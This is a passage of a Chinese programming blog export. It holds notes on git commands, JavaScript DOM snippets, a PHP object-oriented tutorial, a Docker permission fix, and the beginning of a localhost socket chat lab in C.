<h4 id="推送"><a href="#推送" class="headerlink" title="推送"></a>推送</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git push origin dev:dev # 将本地dev分支推送到origin&#x2F;dev</span><br><span class="line">git push REMOTE :BRANCH # 将空分支提交到远程分支，即删除远程分支</span><br><span class="line">git push --upstream origin master # 使当前分支跟踪远程分支</span><br></pre></td></tr></table></figure>
<h4 id="拉取"><a href="#拉取" class="headerlink" title="拉取"></a>拉取</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git fetch origin master # 拉取远程仓库origin的master分支并存到分支origin&#x2F;master中</span><br><span class="line">git merge origin&#x2F;master # 将指定远程分支合并到当前分支中</span><br><span class="line"></span><br><span class="line">git pull origin master # 合并fetch与merge两个操作</span><br></pre></td></tr></table></figure>
<h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git config --list # 查看配置文件</span><br><span class="line">git config --list --global #</span><br><span class="line">git config add</span><br></pre></td></tr></table></figure>
<h2 id="项目管理流程"><a href="#项目管理流程" class="headerlink" title="项目管理流程"></a>项目管理流程</h2><p><a href="https://study-resources-1256288674.cos.ap-chengdu.myqcloud.com/Git-mindMapping.png"><img src="https://study-resources-1256288674.cos.ap-chengdu.myqcloud.com/Git-mindMapping.png" alt="Git脑图"></a></p>
<h3 id="项目提交"><a href="#项目提交" class="headerlink" title="项目提交"></a>项目提交</h3><ol>
<li><p>初始化/下载项目</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git init</span><br><span class="line">git clone url</span><br></pre></td></tr></table></figure></li>
<li><p>创建修改</p>
</li>
<li><p>添加修改到暂存</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git add filename</span><br></pre></td></tr></table></figure></li>
<li><p>提交暂存</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git commit -m &quot;log&quot;</span><br></pre></td></tr></table></figure>
<h3 id="远程协作"><a href="#远程协作" class="headerlink" title="远程协作"></a>远程协作</h3></li>
<li><p>拉取 &amp; 合并远程分支</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git fetch origin master # origin&#x2F;master</span><br><span class="line">git merge origin&#x2F;master</span><br><span class="line"></span><br><span class="line">git pull origin master</span><br></pre></td></tr></table></figure></li>
<li><p>推送到远程仓库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git push origin master</span><br></pre></td></tr></table></figure></li>
<li><p>合并提交 &amp; 变基</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git fetch origin master</span><br><span class="line">git rebase origin&#x2F;master</span><br></pre></td></tr></table></figure>
<h3 id="版本管理"><a href="#版本管理" class="headerlink" title="版本管理"></a>版本管理</h3></li>
<li><p>常驻分支</p>
<p>master</p>
<p>development</p>
<p>* fix#1000</p>
</li>
<li><p>为版本打标签</p>
</li>
<li><p><a href="https://github.com/1000Delta/A11N0tes/blob/master/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/%E8%BD%AF%E4%BB%B6%E7%89%88%E6%9C%AC%E5%8F%B7.md">版本号规范</a></p>
</li>
<li><p><a href="https://juejin.im/post/5afc5242f265da0b7f44bee4">优雅的使用commit</a></p>
</li>
</ol>
]]></content>
      <categories>
        <category>Note</category>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript 模板</title>
    <url>/2019/07/15/Note/JavaScript%E6%A8%A1%E6%9D%BF/</url>
    <content><![CDATA[<h1 id="JavaScript-模板"><a href="#JavaScript-模板" class="headerlink" title="JavaScript 模板"></a>JavaScript 模板</h1><a id="more"></a>

<pre><code>//获取父元素  
row.parentNode.parentNode.parentNode.removeChild(row.parentNode.parentNode);  
       
//获取子元素  
tr2[n].firstElementChild  
       
//input值获取  
var x=document.getElementById(&quot;name&quot;).value  
       
//radio选择获取  
var y=document.getElementsByName(&quot;sex&quot;);  
var sexname = null;  
for(var m=0;m&lt;y.length;m++)&#123;  
    if(y[m].checked)&#123;  
        sexname = y[m].value;  
    &#125;  
&#125;  
      
//inner HTML格式  
innerHTML=&quot;&lt;td&gt;&quot;+n+&quot;&lt;/td&gt;&quot;+&lt;td&gt;&lt;a href=&#39;#&#39; onclick=&#39;deleteTr(this)&#39;&gt;删除&lt;/a&gt;&lt;/td&gt;&quot;            
//字符串（标签）  
innerText = n                           //变量  
      
//alert格式  
alert(&quot;hello world&quot;)                 //字符串  
alert(y）                                  //变量  
      
//一堆同类型标签绑定事件  
function change () &#123;  
    var td = document.getElementsByTagName(&quot;td&quot;);  
    for(var i=0;i&lt;td.length;i++)&#123;  
        if(i&gt;3)&#123;  
            td[i].onmouseover = function() &#123;  
            this.style.color = &quot;red&quot;;  
        &#125;  
           td[i].onmouseout = function() &#123;  
            this.removeAttribute(&quot;style&quot;);                                  
        &#125;  
    &#125;  
&#125;  </code></pre>
]]></content>
      <categories>
        <category>Note</category>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP面向对象</title>
    <url>/2019/05/20/Note/PHP%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/</url>
    <content><![CDATA[<h1 id="PHP面向对象"><a href="#PHP面向对象" class="headerlink" title="PHP面向对象"></a>PHP面向对象</h1><h2 id="为什么要面向对象"><a href="#为什么要面向对象" class="headerlink" title="为什么要面向对象"></a>为什么要面向对象</h2><p>面向对象的好处远远不只是便于维护代码，他所体现的面向对象的思想将一个体系分作很多的个体，这样来，别人只需要知道怎么调用你所写的类或对象。</p>
<a id="more"></a>

<h2 id="类和对象："><a href="#类和对象：" class="headerlink" title="类和对象："></a>类和对象：</h2><p><strong>类</strong>： 定义了一件事物的抽象特点。类的定义包含了数据的形式以及对数据的操作。<br><strong>对象</strong>：是类的实例。<br>具体一点，有一个类是人类，这个人类就是抽象的，而张三这个人就是实例化的对象。<br>类是对象的<strong>模板</strong>，对象是类的<strong>实例</strong><br><strong>成员变量</strong> − 定义在类内部的变量。该变量的值对外是不可见的，但是可以通过成员函数访问，在类被实例化为对象后，该变量即可称为对象的<strong>属性</strong>。<br>类结构</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class classname</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>类的基本定义</strong>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class classname</span><br><span class="line">&#123;</span><br><span class="line">    成员属性&#x2F;&#x2F;前面有访问控制符 public protected private</span><br><span class="line">    成员方法</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>创建对象</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$对象名 &#x3D; new 类名（）；</span><br></pre></td></tr></table></figure>
<p>类名不区分大小写，采用驼峰式</p>
<p><strong>访问对象的属性</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$对象名-&gt;$属性名</span><br></pre></td></tr></table></figure>
<p>对象传递机制说明<br>对象传递的不是数据本身，而是<strong>对象标识符</strong><br>这里有两个有趣的例子</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class cat</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $age;</span><br><span class="line">    public $color;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new cat();</span><br><span class="line">$a-&gt;name &#x3D; &#39;Tom&#39;;</span><br><span class="line">$a-&gt;age &#x3D; &#39;2&#39;;</span><br><span class="line">$a-&gt;color &#x3D; &#39;red&#39;;</span><br><span class="line">$b &#x3D; $a;</span><br><span class="line">echo $b-&gt;color;</span><br><span class="line">$b-&gt;name &#x3D; &quot;Sam&quot;;</span><br><span class="line">echo $a-&gt;name;</span><br></pre></td></tr></table></figure>
<p>在这里，你会发现输出的a的name居然随着b的修改而变化了<br>这是应为，这种传值是传对象标识符，相当于在创建<code>$a</code>的时候就创建了一个#1的对象标识符，对<code>$b</code>来说他只是复制了一份和<code>$a</code>一模一样的对象标识符指向数据存储的位置，所以会得到那种结果啦</p>
<p>下面这个有点不同，仔细分析一下结果吧</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class cat</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $age;</span><br><span class="line">    public $color;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new cat();</span><br><span class="line">$a-&gt;name &#x3D; &#39;Tom&#39;;</span><br><span class="line">$a-&gt;age &#x3D; &#39;2&#39;;</span><br><span class="line">$a-&gt;color &#x3D; &#39;red&#39;;</span><br><span class="line">$b &#x3D; &amp;$a;&#x2F;&#x2F;传址</span><br><span class="line">$b &#x3D; &#39;blue&#39;;</span><br><span class="line">echo $a-&gt;color;&#x2F;&#x2F;会报错哦</span><br><span class="line">echo $a;</span><br></pre></td></tr></table></figure>
<p><strong>成员函数</strong><br>基本样式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class classname</span><br><span class="line">&#123;</span><br><span class="line">    访问修饰符 function 函数名(参数)&#123;</span><br><span class="line">        alalalal;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>构造函数</strong><br>在class里面的构造函数<br>构造函数嘛，用于创建对象时给属性赋初始值和调用成员函数<br>构造函数的访问修饰符默认为public<br>没有返回值<br>一个类中只能有一个构造函数<br>样式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class classname</span><br><span class="line">&#123;</span><br><span class="line">    public $color;</span><br><span class="line">    public $age;</span><br><span class="line">    访问修饰符 function __construct($param_color,$param_age)&#123;</span><br><span class="line">        $this-&gt;color &#x3D; $param_color;</span><br><span class="line">        $this-&gt;age &#x3D; $param_age;&#x2F;&#x2F;$this代表调用这个构造函数的对象</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$coco &#x3D; new classname(&#39;red&#39;,&#39;12&#39;);&#x2F;&#x2F;在创建这个新的对象Coco时系统自动完成了对象的属性定义</span><br></pre></td></tr></table></figure>
<p><strong>析构函数</strong><br>析构函数(destructor) 与构造函数相反，当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数<br>释放资源，关闭文件<br>默认情况下，先创建的对象后销毁（栈区的分配）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class classname</span><br><span class="line">&#123;</span><br><span class="line">    function __destruct()&#123;&#x2F;&#x2F;No param</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在程序结束前也会销毁对象<br>当没有变量指向对象，这个对象就会被销毁<br>在销毁时就会调用析构函数<br>析构函数并不是销毁对象本身，而是销毁对象创造的相关资源，如数据库连接<br>PHP的内存回收机制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test&#123;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        echo &quot;当对象销毁时会调用！！！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; $b &#x3D; $c &#x3D; new test();</span><br><span class="line"></span><br><span class="line">$a &#x3D; null;</span><br><span class="line">unset($b);</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;hr &#x2F;&gt;&quot;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>此例子，如上图，有三个变量引用<code>$a,$b,$c</code>指向test对象，test对象就有3个引用计数，当<code>$a</code> = null时，<code>$a</code>对test对象的引用丢失，计数-1，变为2，当<code>$b</code>被unset()时，<code>$b</code>对test对象的引用也丢失了，计数再-1，变为1，最后页面加载完毕，<code>$c</code>指向test对象的引用自动被释放，此时计数再-1，变为0，test对象已没有变量引用，就会被销毁，此时就会调用析构函数。<br><strong>访问修饰符初讲</strong><br>类中的方法可以被定义为公有（public），私有(private)或受保护(protected)。如果没有设置这些关键字，则该方法默认为公有。<br>其中，public定义的方法或属性在类的内部和外部都可以调用或读取<br>private和protected只能在类的内部调用或读取，他们的不同后面讲解。</p>
<p><strong>魔术方法</strong><br>__set()<br><strong>调用条件</strong>：在类的<strong>外部</strong>对受保护的或者私有的属性赋值<br>可以对程序有更好的控制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Dog</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $age;</span><br><span class="line">    public $sex;</span><br><span class="line">    public function __construct($name,$sex)&#123;&#x2F;&#x2F;这里没有问题，$sex只是个参数哦，什么名字都行</span><br><span class="line">        $this-&gt;name &#x3D; $name;&#x2F;&#x2F;但是为了方便阅读，还是尽量规范参数的命名</span><br><span class="line">        $this-&gt;age &#x3D; $sex;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __set($name,$value)&#123;</span><br><span class="line">        $this-&gt;$name &#x3D; $value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;在类的外部</span><br><span class="line">$coco &#x3D; new Dog(&quot;titi&quot;,1);</span><br><span class="line">echo $coco-&gt;name;</span><br><span class="line">echo $coco-&gt;age;</span><br><span class="line">$coco-&gt;age &#x3D; 2;</span><br><span class="line">$coco-&gt;name&#x3D;&quot;coco&quot;;</span><br><span class="line">echo $coco-&gt;name;</span><br><span class="line">echo $coco-&gt;age;</span><br></pre></td></tr></table></figure>
<p>不光可以对其赋值，还可以完成对值的一些操作<br>比如判断要修改的值是否符合修改要求等等，下面的几个魔术方法也一样<br>__get<br><strong>调用条件</strong>：在类的<strong>外部</strong>得到受保护的或私有的属性的值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Dog</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    private $age;</span><br><span class="line">    public function __construct($value1,$value2)&#123;</span><br><span class="line">        $this-&gt;nmae &#x3D; $value1;</span><br><span class="line">        $this-&gt;age&#x3D; $value2;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __get($name)&#123;</span><br><span class="line">        return $this-&gt;$name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;在类的外部</span><br><span class="line">$coco &#x3D; new Dog(&quot;titi&quot;,1);</span><br><span class="line">echo $coco-&gt;name;</span><br><span class="line">echo $coco-&gt;age;</span><br></pre></td></tr></table></figure>
<p>__isset()<br><strong>调用条件</strong>：在<strong>外部</strong> isset()受保护的或者私密的属性</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Dog</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    private $age;</span><br><span class="line">    public function __construct($name,$age)&#123;</span><br><span class="line">        $this-&gt;nmae &#x3D; $name;</span><br><span class="line">        $this-&gt;age &#x3D; $age;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __isset($name)&#123;</span><br><span class="line">        isset($this-&gt;$name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;在类的外部</span><br><span class="line">$coco &#x3D; new Dog(&quot;titi&quot;,1);</span><br><span class="line">var_dump(isset($coco-&gt;age));&#x2F;&#x2F;这个返回true 或者faulse</span><br></pre></td></tr></table></figure>
<p>__unset<br><strong>调用条件</strong>：在外部释放受保护的或者私密的属性</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Dog</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    private $age;</span><br><span class="line">    public function __construct($name,$sex)&#123;</span><br><span class="line">        $this-&gt;nmae &#x3D; $name;</span><br><span class="line">        $this-&gt;sex &#x3D; $sex;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __unset($name)&#123;</span><br><span class="line">        unset($this-&gt;$name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;在类的外部</span><br><span class="line">$coco &#x3D; new Dog(&quot;titi&quot;,1);</span><br><span class="line">unset($coco-&gt;$age);</span><br><span class="line">var_dump(($coco);</span><br></pre></td></tr></table></figure>
<h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a><strong>继承</strong></h2><p><strong>父类</strong>：一个类被其他类继承，可将该类称为父类，或基类，或超类。<br><strong>子类</strong>：一个类继承其他类称为子类，也可称为派生类。<br><strong>访问修饰符补充</strong>：<br>public,protected修饰的方法和属性可被继承，而private不可<br><strong>值得注意的是，PHP中，如果在子类中创建了构造函数，则子类不会在构造函数中隐式调用父类中的构造函数，要执行父类的构造函数，需要在子类的构造函数中调用parent::__construct()。如果子类中没有定义构造函数则会如同普通类一样从父类继承（非private）</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class A&#x2F;&#x2F;父类</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    private $age;</span><br><span class="line">    protected $job;</span><br><span class="line">    function __construct($name,$age,$job)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name &#x3D; $name;</span><br><span class="line">        $this-&gt;age &#x3D; $age;</span><br><span class="line">        $this-&gt;job &#x3D; $job;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function speak()&#123;</span><br><span class="line">        echo &quot;hello&quot;.$this-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class B extends A&#x2F;&#x2F;子类</span><br><span class="line">&#123;</span><br><span class="line">    public function eat()&#123;</span><br><span class="line">        echo &quot;&lt;br &#x2F;&gt;eat&quot;.$this-&gt;job;&#x2F;&#x2F;如果是age会如何呢？</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new B(&quot;Tom&quot;,18,&quot;student&quot;);</span><br><span class="line">$a-&gt;speak();</span><br><span class="line">$a-&gt;eat();</span><br></pre></td></tr></table></figure>
<p><strong>方法重写</strong><br>如果从父类继承的方法不能满足子类的需求，可以对其进行改写，这个过程叫方法的覆盖（override），也称为方法的重写。<br><strong>抽象方法和抽象类</strong><br>含有抽象方法的一定是抽象类<br>抽象类不一定含有抽象方法<br>抽象类中可以有一般的函数<br>抽象类无法实例化，只能由一个继承他的子类实例化，继承他的子类将实现所有的抽象方法（重写）<br>抽象体</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">abstract class Father&#123;</span><br><span class="line">    public abstract function run();&#x2F;&#x2F;抽象方法是没有方法体的</span><br><span class="line">    public function eat()&#123;&#x2F;&#x2F;这个就是个普通的成员方法（函数）</span><br><span class="line">        echo &quot;eat&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class son extends Father&#123;</span><br><span class="line">    public function run()&#123;</span><br><span class="line">        &#x2F;&#x2F;父债子偿</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>抽象类其实就是介于普通类和接口之间的一个类，普通类需要实现所有方法，接口所有方法都不需要实现，而抽象类可以根据自己的需要去选择实现部分方法；但是一旦类里面有抽象方法，这个类就必须是抽象类，另外注意，抽象类跟接口一样，不能直接实例化为对象，只能被普通类继承，，其实抽象类同样体现了面向对象的多态现象<br>注意：<br>有什么可以实现类似多重继承的东西呢？接下来介绍接口<br><strong>接口：interface</strong><br>接口是通过 interface 关键字来定义的，就像定义一个标准的类一样，但其中定义所有的方法都是空的。</p>
<blockquote>
<p>接口是一种对象用于与外界进行交互行为的约束，对于实现接口的类，要求一定要满足接口所指定的方法，也可以成为满足接口的“特征”。<br>OOP中类有一种性质叫“封装”，就是要求类内部与外界环境要进行隔离，而类又需要实现一定的业务功能，因此就需要暴露出能够对外界产生影响的部分，这部分就被称之为接口。 ——–许致中大佬</p>
</blockquote>
<p><strong>我的理解</strong>：相当于一个菜单，列出了里面的功能，功能怎么实现外界不用管，只要用就可以</p>
<p>接口中定义的所有方法都必须是<strong>公有</strong>，这是接口的特性。<br>要实现一个接口，使用 implements 操作符。类中必须实现接口中定义的所有方法，否则会报一个致命错误。类可以实现多个接口，用逗号来分隔多个接口的名称</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">interface C</span><br><span class="line">&#123;</span><br><span class="line">    function run();&#x2F;&#x2F;因为公有是默认值，so略</span><br><span class="line">&#125;</span><br><span class="line">interface E</span><br><span class="line">&#123;</span><br><span class="line">    function walk();</span><br><span class="line">&#125;</span><br><span class="line">class D implements C,E</span><br><span class="line">&#123;</span><br><span class="line">    function  run()&#123;</span><br><span class="line">        echo &quot;&lt;br&#x2F;&gt;run&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    function  walk()&#123;</span><br><span class="line">        echo &quot;&lt;br&#x2F;&gt;walk&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有没有一种方法是既能实现类似多继承又能不带来麻烦呢？<br><strong>Trait</strong><br>很像接口，但是接口中的方法都是不会写的，只是放了一个定义，但是Trait就会在定义这个方法的时候写好具体的操作，例子如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">trait</span><br><span class="line">trait能在定义一个标准类的时候定义它的方法</span><br><span class="line">trait SayWorld &#123;</span><br><span class="line">    public function sayHello() &#123;</span><br><span class="line">        echo &#39;Hello World!&#39;;&#x2F;&#x2F;trait中的</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class MyHelloWorld extends Base &#123;</span><br><span class="line">    use SayWorld;&#x2F;&#x2F;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>优先级</strong><br>当前类中的方法或属性大于trait中的大于父类中的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Base &#123;</span><br><span class="line">    public function sayHello() &#123;</span><br><span class="line">        echo &#39;Hello &#39;;&#x2F;&#x2F;父类中的</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">trait SayWorld &#123;</span><br><span class="line">    public function sayHello() &#123;</span><br><span class="line">        echo &#39;World&#39;;&#x2F;&#x2F;trait中的</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class MyHelloWorld extends Base &#123;</span><br><span class="line">    use SayWorld;</span><br><span class="line">    public function sayHello()&#123;&#x2F;&#x2F;当前类的</span><br><span class="line">        echo &#39;!&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o &#x3D; new MyHelloWorld();</span><br><span class="line">$o-&gt;sayHello();</span><br><span class="line">&#x2F;&#x2F;输出结果是 !</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>引用多个trait</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">trait Hello &#123;</span><br><span class="line">    public function sayHello() &#123;</span><br><span class="line">        echo &#39;Hello &#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">trait World &#123;</span><br><span class="line">    public function sayWorld() &#123;</span><br><span class="line">        echo &#39;World&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class MyHelloWorld &#123;</span><br><span class="line">    use Hello, World;</span><br><span class="line">    public function sayExclamationMark() &#123;</span><br><span class="line">        echo &#39;!&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Note</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>docker命令使用权限问题</title>
    <url>/2020/01/07/Note/docker%E6%9D%83%E9%99%90%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h1 id="docker命令使用权限问题"><a href="#docker命令使用权限问题" class="headerlink" title="docker命令使用权限问题"></a>docker命令使用权限问题</h1><h2 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ERROR: Got permission denied while trying to connect to the Docker daemon socket......</span><br></pre></td></tr></table></figure>
<a id="more"></a>

<h2 id="解决"><a href="#解决" class="headerlink" title="解决:"></a>解决:</h2><p>权限问题,当前用户没有运行docker的权限</p>
<h3 id="建议解决办法"><a href="#建议解决办法" class="headerlink" title="建议解决办法"></a>建议解决办法</h3><p>将当前用户加入docker用户组</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test@ubuntu~$whoami </span><br><span class="line">test</span><br><span class="line">test@ubuntu~$sudo groupadd docker</span><br><span class="line">test@ubuntu~$sudo usermod test -aG docker </span><br><span class="line">#物理机需要注销登录,重新登录</span><br><span class="line">#终端连接需退出登录,重新登录</span><br><span class="line">#重新登录后运行下面命令</span><br><span class="line">test@ubuntu~$groups</span><br><span class="line">test ....... docker</span><br><span class="line">#出现docker,再运行docker命令,不会再对权限报错</span><br></pre></td></tr></table></figure>
<h3 id="不推荐解决办法"><a href="#不推荐解决办法" class="headerlink" title="不推荐解决办法"></a>不推荐解决办法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">将&#x2F;var&#x2F;run&#x2F;docker.socket文件权限增加</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Note</category>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 实验 socket网络编程</title>
    <url>/2020/11/05/Note/Linux%E5%AE%9E%E9%AA%8Csocket%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="Linux-实验-socket网络编程"><a href="#Linux-实验-socket网络编程" class="headerlink" title="Linux 实验 socket网络编程"></a>Linux 实验 socket网络编程</h1><h2 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h2><p>编写两个程序，一个Server，一个Client，分别运行在两个shell窗口，通过Socket实现两个Shell窗口的即时通信</p>
<p>（即在A窗口输入Hello，B窗口会立即显示“Client：Hello”。B窗口也可以输入任意内容，比如“Nice to meet you”，在A窗口立即显示“Server： Nice to meet you”。）<br>（提示：本地地址是127.0.0.1，端口最好10000以上，避免占据其他应用端口。注意访问权限问题。）</p>
<a id="more"></a>

<h2 id="Server-c"><a href="#Server-c" class="headerlink" title="Server.c"></a>Server.c</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;netinet&#x2F;in.h&gt;</span><br><span class="line">#include &lt;arpa&#x2F;inet.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;types.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;socket.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;wait.h&gt;</span><br><span class="line"></span><br><span class="line">#define PORT 23456</span><br><span class="line">#define SERVER_ADDR &quot;127.0.0.1&quot;</span><br><span class="line"></span><br><span class="line">int server_socket,client_socket;</span><br><span class="line"></span><br><span class="line">void func_kill(int sig)&#123;</span><br><span class="line">    &#x2F;&#x2F; printf(&quot;%d &quot;,close(server_socket));</span><br><span class="line">    &#x2F;&#x2F; printf(&quot;%d &quot;,close(client_socket));</span><br><span class="line">    close(server_socket);</span><br><span class="line">    close(client_socket);</span><br><span class="line">    signal(SIGINT,SIG_DFL);</span><br><span class="line">    exit(3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F; 俩个子进程 pid1 用于接收 pid2 用于发送</span><br><span class="line">	int pid1,pid2;</span><br><span class="line">    &#x2F;&#x2F; 等待pid退出信号</span><br><span class="line">    int pid_exit_status;</span><br><span class="line">    &#x2F;&#x2F; 绑定端口结果 监听端口结果</span><br><span class="line">    int Bind_res,Listen_res;</span><br><span class="line">    &#x2F;&#x2F; 客户端地址块大小</span><br><span class="line">	socklen_t clientaddr_len;</span><br><span class="line">    &#x2F;&#x2F; 服务端地址块 客户端地址块</span><br><span class="line">	struct sockaddr_in serveraddr,clientaddr;</span><br><span class="line">    &#x2F;&#x2F; 存储接受的消息 发送的消息</span><br><span class="line">	char recv_msg[100],send_msg[100];</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F;创建服务socket</span><br><span class="line">	server_socket &#x3D; socket(AF_INET,SOCK_STREAM,0);</span><br><span class="line">    if(server_socket&#x3D;&#x3D;-1)</span><br><span class="line">	&#123;</span><br><span class="line">		perror(&quot;The socket is error!\n&quot;);</span><br><span class="line">		exit(0);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 设置端口绑定,取消TIME_WAIT,避免占用</span><br><span class="line">    struct linger ling;</span><br><span class="line">    ling.l_onoff &#x3D; 1;</span><br><span class="line">    ling.l_linger &#x3D; 0;</span><br><span class="line">    setsockopt(server_socket,SOL_SOCKET, SO_LINGER, &amp;ling, sizeof(ling));</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">    &#x2F;&#x2F; 设置服务端地址</span><br><span class="line">	serveraddr.sin_family &#x3D; AF_INET; &#x2F;&#x2F;ipv4</span><br><span class="line">	